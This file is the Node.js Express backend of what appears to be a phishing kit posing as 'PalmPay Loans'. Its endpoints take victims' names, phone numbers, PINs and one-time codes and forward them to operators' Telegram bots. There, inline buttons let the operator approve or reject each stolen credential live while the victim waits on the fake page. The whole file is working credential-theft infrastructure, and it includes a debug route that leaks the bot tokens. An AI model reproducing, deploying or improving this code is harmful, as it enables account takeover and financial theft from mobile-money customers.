require('dotenv').config();
const express = require('express');
const axios = require('axios');
const { v4: uuidv4 } = require('uuid');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 10000;
const DOMAIN = process.env.BACKEND_DOMAIN || 'https://palmpay-loans-8ioh.onrender.com';

// ---------------- MEMORY STORES ----------------
// For DETAILS (PIN) approval
const approvedDetails = {};   // requestId -> boolean (true/false/null)
const blockedDetails = {};    // requestId -> true if blocked
// For OTP (CODE) approval
const approvedCodes = {};
// Map requestId -> botId (to know which bot to respond to)
const requestBotMap = {};

// ---------------- MULTI-BOT STORE ----------------
let bots = [];
Object.keys(process.env).forEach(key => {
    const match = key.match(/^BOT(\d+)_TOKEN$/);
    if (!match) return;
    const index = match[1];
    const botToken = process.env[`BOT${index}_TOKEN`];
    const chatId = process.env[`BOT${index}_CHATID`];
    if (botToken && chatId) {
        bots.push({ botId: `bot${index}`, botToken, chatId });
    }
});
console.log('✅ Bots loaded:', bots.map(b => b.botId));

// ---------------- MIDDLEWARE ----------------
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

// ---------------- HELPERS ----------------
function getBot(botId) {
    return bots.find(b => b.botId === botId);
}

async function sendTelegramMessage(bot, text, inlineKeyboard = []) {
    try {
        await axios.post(`https://api.telegram.org/bot${bot.botToken}/sendMessage`, {
            chat_id: bot.chatId,
            text,
            reply_markup: inlineKeyboard.length ? { inline_keyboard: inlineKeyboard } : undefined
        });
    } catch (err) {
        console.error('Telegram send error:', err.response?.data || err.message);
    }
}

async function answerCallback(bot, callbackId) {
    try {
        await axios.post(`https://api.telegram.org/bot${bot.botToken}/answerCallbackQuery`, {
            callback_query_id: callbackId
        });
    } catch (err) {
        console.error(err.response?.data || err.message);
    }
}

// ---------------- WEBHOOK SETUP ----------------
async function setWebhook(bot) {
    try {
        const webhookUrl = `${DOMAIN}/telegram-webhook/${bot.botId}`;
        await axios.get(`https://api.telegram.org/bot${bot.botToken}/setWebhook?url=${webhookUrl}`);
        console.log(`✅ Webhook set for ${bot.botId}`);
    } catch (err) {
        console.error(`❌ Webhook failed for ${bot.botId}:`, err.response?.data || err.message);
    }
}

async function setAllWebhooks() {
    for (const bot of bots) await setWebhook(bot);
}

// ---------------- PAGES (redirects) ----------------
app.get('/bot/:botId', (req, res) => {
    const bot = getBot(req.params.botId);
    if (!bot) return res.status(404).send('Invalid bot link');
    res.redirect(`/details.html?botId=${bot.botId}`);
});
app.get('/details', (req, res) => res.sendFile(path.join(__dirname, 'public', 'details.html')));
app.get('/code', (req, res) => res.sendFile(path.join(__dirname, 'public', 'code.html')));
app.get('/success', (req, res) => res.sendFile(path.join(__dirname, 'public', 'success.html')));

// ---------------- 1. SUBMIT DETAILS (PIN) ----------------
app.post('/submit-details', (req, res) => {
    const { name, phone, pin, botId } = req.body;
    const bot = getBot(botId);
    if (!bot) return res.status(400).json({ error: 'Invalid bot' });

    const requestId = uuidv4();
    approvedDetails[requestId] = null;      // pending
    blockedDetails[requestId] = false;
    requestBotMap[requestId] = botId;

    const message = `🔐 *Nova solicitação de detalhes*\n\n` +
                    `👤 *Nome:* ${name}\n` +
                    `📱 *Telefone:* ${phone}\n` +
                    `🔐 *PIN:* ${pin}`;

    sendTelegramMessage(bot, message, [[
        { text: '✅ Correct PIN', callback_data: `pin_ok:${requestId}` },
        { text: '❌ Wrong PIN', callback_data: `pin_bad:${requestId}` },
        { text: '🛑 Block', callback_data: `pin_block:${requestId}` }
    ]]);

    res.json({ requestId });
});

app.get('/check-details/:requestId', (req, res) => {
    const requestId = req.params.requestId;
    if (blockedDetails[requestId]) {
        return res.json({ blocked: true, message: 'User blocked' });
    }
    const status = approvedDetails[requestId];
    if (status === undefined) return res.status(404).json({ error: 'Request not found' });
    res.json({ approved: status }); // null = pending, true/false = resolved
});

// ---------------- 2. SUBMIT OTP CODE ----------------
app.post('/submit-code', (req, res) => {
    const { name, phone, code, botId } = req.body;
    const bot = getBot(botId);
    if (!bot) return res.status(400).json({ error: 'Invalid bot' });

    const requestId = uuidv4();
    approvedCodes[requestId] = null;
    requestBotMap[requestId] = botId;

    const message = `🔑 *Verificação de código*\n\n` +
                    `👤 *Nome:* ${name}\n` +
                    `📱 *Telefone:* ${phone}\n` +
                    `🔢 *Código:* ${code}`;

    sendTelegramMessage(bot, message, [[
        { text: '✅ Correct Code', callback_data: `code_ok:${requestId}` },
        { text: '❌ Wrong Code', callback_data: `code_bad:${requestId}` },
        { text: '📱 Max-Devices', callback_data: `device-limit:${requestId}` }
    ]]);

    res.json({ requestId });
});

app.get('/check-code/:requestId', (req, res) => {
    const status = approvedCodes[req.params.requestId];
    if (status === undefined) return res.status(404).json({ error: 'Request not found' });
    res.json({ approved: status });
});

// ---------------- TELEGRAM WEBHOOK ----------------
app.post('/telegram-webhook/:botId', async (req, res) => {
    const bot = getBot(req.params.botId);
    if (!bot) return res.sendStatus(404);

    const cb = req.body.callback_query;
    if (!cb) return res.sendStatus(200);

    const [action, requestId] = cb.data.split(':');
    let feedback = '';

    // Handle PIN / DETAILS actions
    if (action === 'pin_ok') {
        approvedDetails[requestId] = true;
        feedback = '✅ PIN approved – user can proceed to OTP.';
    } else if (action === 'pin_bad') {
        approvedDetails[requestId] = false;
        feedback = '❌ PIN rejected – user will be notified.';
    } else if (action === 'pin_block') {
        blockedDetails[requestId] = true;
        feedback = '🛑 User blocked – no further attempts allowed.';
    }

    // Handle CODE / OTP actions
    else if (action === 'code_ok') {
        approvedCodes[requestId] = true;
        feedback = '✅ Code approved – user will be redirected to success.';
    } else if (action === 'code_bad') {
        approvedCodes[requestId] = false;
        feedback = '❌ Code rejected – user can retry.';
    } else if (action === 'device-limit') {
        approvedCodes[requestId] = false;
        feedback = '📱 Device limit reached – user will see error.';
    }

    // Send confirmation to Telegram
    if (feedback) {
        await sendTelegramMessage(bot, `📝 *Feedback:*\n${feedback}`);
    }
    await answerCallback(bot, cb.id);
    res.sendStatus(200);
});

// ---------------- OPTIONAL: Manual approval endpoints (for direct links) ----------------
app.post('/approve-details/:requestId', (req, res) => {
    const data = approvedDetails[req.params.requestId];
    if (data === undefined) return res.status(404).json({ error: 'Request not found' });
    approvedDetails[req.params.requestId] = true;
    res.json({ success: true, message: 'Details approved.' });
});

app.post('/approve-code/:requestId', (req, res) => {
    const data = approvedCodes[req.params.requestId];
    if (data === undefined) return res.status(404).json({ error: 'Request not found' });
    approvedCodes[req.params.requestId] = true;
    res.json({ success: true, message: 'Code approved.' });
});

// ---------------- DEBUG ----------------
app.get('/debug/bots', (req, res) => res.json(bots));

// ---------------- START SERVER ----------------
setAllWebhooks().then(() => {
    app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
});